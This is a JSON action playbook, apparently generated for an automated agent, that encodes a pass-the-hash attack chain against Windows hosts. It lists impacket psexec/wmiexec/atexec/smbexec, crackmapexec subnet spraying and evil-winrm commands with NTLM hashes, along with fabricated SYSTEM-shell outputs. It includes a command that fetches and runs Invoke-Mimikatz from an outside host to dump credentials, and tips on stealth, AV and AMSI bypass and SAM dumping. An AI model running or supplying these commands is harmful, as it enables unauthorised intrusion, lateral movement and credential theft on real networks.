{
  "name": "pass_the_hash_attacks",
  "description": "Pass-the-Hash attacks using NTLM hashes for authentication without passwords",
  "pattern": "pass.*hash|pth.*attack|ntlm.*auth",
  "parameters": [
    "username",
    "ntlm_hash",
    "target"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "impacket-psexec",
        "args": [
          "-hashes",
          "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
          "administrator@10.10.10.20"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.10.20.....\n[*] Found writable share ADMIN$\n[*] Uploading file GfQzRJeA.exe\n[*] Opening SVCManager on 10.10.10.20.....\n[*] Creating service QHUB on 10.10.10.20.....\n[*] Starting service QHUB.....\n[!] Press help for extra shell commands\n\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nWEB-01\n\nPass-the-Hash successful!\n  Method: PSExec with NTLM hash\n  Target: 10.10.10.20 (WEB-01)\n  User: administrator\n  Hash: 31d6cfe0d16ae931b73c59d7e0c089c0\n  Access: SYSTEM shell\n\nNo password needed - only NTLM hash!"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "impacket-wmiexec",
        "args": [
          "-hashes",
          "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
          "CORP/sqlservice@10.10.10.20"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\n\nC:\\> whoami\ncorp\\sqlservice\n\nC:\\> hostname  \nWEB-01\n\nC:\\> net localgroup administrators\nAlias name     administrators\nMembers\n---------------\nAdministrator\nadmin-desktop\nsqlservice\n\nsqlservice is local admin!\n\nWMI execution via Pass-the-Hash:\n  Method: WMI (Windows Management Instrumentation)\n  Target: 10.10.10.20\n  User: CORP\\sqlservice\n  Hash: 8846f7eaee8fb117ad06bdd830b7586c\n  Access: Remote command execution\n\nAdvantages over PSExec:\n  - No service creation (stealthier)\n  - Uses WMI (often less monitored)\n  - No file upload"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "crackmapexec",
        "args": [
          "smb",
          "10.10.10.0/24",
          "-u",
          "administrator",
          "-H",
          "31d6cfe0d16ae931b73c59d7e0c089c0",
          "--local-auth"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "SMB         10.10.10.10     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:CORP) (signing:True) (SMBv1:False)\nSMB         10.10.10.10     445    DC01             [-] corp.local\\administrator:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE\nSMB         10.10.10.20     445    WEB-01           [*] Windows Server 2019 Standard 17763 x64 (name:WEB-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         10.10.10.20     445    WEB-01           [+] WEB-01\\administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB         10.10.10.30     445    DB-01            [*] Windows Server 2016 Standard 14393 x64 (name:DB-01) (domain:CORP) (signing:False) (SMBv1:False)\nSMB         10.10.10.30     445    DB-01            [+] DB-01\\administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB         10.10.10.40     445    FILE-01          [*] Windows Server 2012 R2 Standard 9600 x64 (name:FILE-01) (domain:CORP) (signing:False) (SMBv1:True)\nSMB         10.10.10.40     445    FILE-01          [+] FILE-01\\administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\n\nPass-the-Hash spray across network:\n  Tested: 4 targets\n  Successful: 3 (WEB-01, DB-01, FILE-01)\n  Failed: 1 (DC01 - domain account rejected)\n  \nLocal administrator hash reuse:\n  Same NTLM hash works on multiple servers\n  Common in organizations (password reuse)\n  \nCompromised systems:\n  10.10.10.20 - WEB-01\n  10.10.10.30 - DB-01\n  10.10.10.40 - FILE-01\n\nLateral movement achieved!"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "impacket-atexec",
        "args": [
          "-hashes",
          "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
          "administrator@10.10.10.20",
          "whoami"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[!] This will work ONLY on Windows >= Vista\n[*] Creating task \\ARTrbtWC\n[*] Running task \\ARTrbtWC\n[*] Deleting task \\ARTrbtWC\n[*] Attempting to read ADMIN$\\Temp\\ARTrbtWC.tmp\nnt authority\\system\n\nAtexec - Scheduled Task execution:\n  Method: Creates scheduled task, executes, deletes\n  Target: 10.10.10.20\n  Command: whoami\n  Output: nt authority\\system\n  \nAdvantages:\n  - Executes as SYSTEM\n  - Auto-cleanup (task deleted)\n  - Works with Pass-the-Hash\n  \nUse for:\n  - Single command execution\n  - Reconnaissance\n  - Credential dumping:\n    atexec -hashes ...:... admin@target \"reg save HKLM\\SAM C:\\temp\\sam\""
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "impacket-smbexec",
        "args": [
          "-hashes",
          "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
          "administrator@10.10.10.20"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nWEB-01\n\nSMBExec - Fileless execution:\n  Method: Creates service, executes via cmd.exe\n  No binary upload (unlike PSExec)\n  Executes commands via service\n  \nAdvantages:\n  - Fileless (no exe upload)\n  - Less AV detection\n  - Works with Pass-the-Hash\n  \nDisadvantages:\n  - Slower than PSExec\n  - Creates service (logged)\n  - Semi-interactive shell only"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "crackmapexec",
        "args": [
          "smb",
          "10.10.10.20",
          "-u",
          "administrator",
          "-H",
          "31d6cfe0d16ae931b73c59d7e0c089c0",
          "-x",
          "\"powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "SMB         10.10.10.20     445    WEB-01           [*] Windows Server 2019 Standard 17763 x64\nSMB         10.10.10.20     445    WEB-01           [+] WEB-01\\administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)\nSMB         10.10.10.20     445    WEB-01           [+] Executed command via wmiexec\nSMB         10.10.10.20     445    WEB-01           Hostname: WEB-01\nSMB         10.10.10.20     445    WEB-01           \nSMB         10.10.10.20     445    WEB-01           Username: sqlservice\nSMB         10.10.10.20     445    WEB-01           Domain:   CORP\nSMB         10.10.10.20     445    WEB-01           NTLM:     8846f7eaee8fb117ad06bdd830b7586c\nSMB         10.10.10.20     445    WEB-01           Password: SQLService2023!\nSMB         10.10.10.20     445    WEB-01           \nSMB         10.10.10.20     445    WEB-01           Username: admin-desktop\nSMB         10.10.10.20     445    WEB-01           Domain:   CORP\nSMB         10.10.10.20     445    WEB-01           NTLM:     64f12cddaa88057e06a81b54e73b949b\n\nPass-the-Hash + Mimikatz credential dump:\n  Lateral movement: admin hash -> WEB-01\n  Mimikatz execution: Dump LSASS credentials\n  New credentials harvested: 2 accounts\n  \nCredential chain:\n  Local admin hash -> PTH to server -> Dump creds -> More hashes\n  \nIterative process:\n  1. Start with one hash\n  2. PTH to accessible systems\n  3. Dump credentials from each\n  4. Repeat with new hashes\n  5. Reach Domain Controller"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "evil-winrm",
        "args": [
          "-i",
          "10.10.10.20",
          "-u",
          "administrator",
          "-H",
          "31d6cfe0d16ae931b73c59d7e0c089c0"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Evil-WinRM shell v3.4\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nweb-01\\administrator\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> hostname\nWEB-01\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> $env:COMPUTERNAME\nWEB-01\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> Get-LocalGroupMember -Group \"Administrators\"\n\nObjectClass Name                    PrincipalSource\n----------- ----                    ---------------\nUser        WEB-01\\Administrator    Local\nGroup       CORP\\Domain Admins      ActiveDirectory\nUser        CORP\\admin-desktop      ActiveDirectory\n\nEvil-WinRM with Pass-the-Hash:\n  Protocol: WinRM (Windows Remote Management)\n  Port: 5985 (HTTP) or 5986 (HTTPS)\n  Authentication: NTLM hash\n  \nFeatures:\n  - Full PowerShell access\n  - Upload/download files\n  - Load PowerShell scripts\n  - Bypass execution policy\n  \nCommands:\n  upload file.exe\n  download C:\\file.txt\n  Bypass-4MSI\n  Invoke-Binary /path/to/binary.exe"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
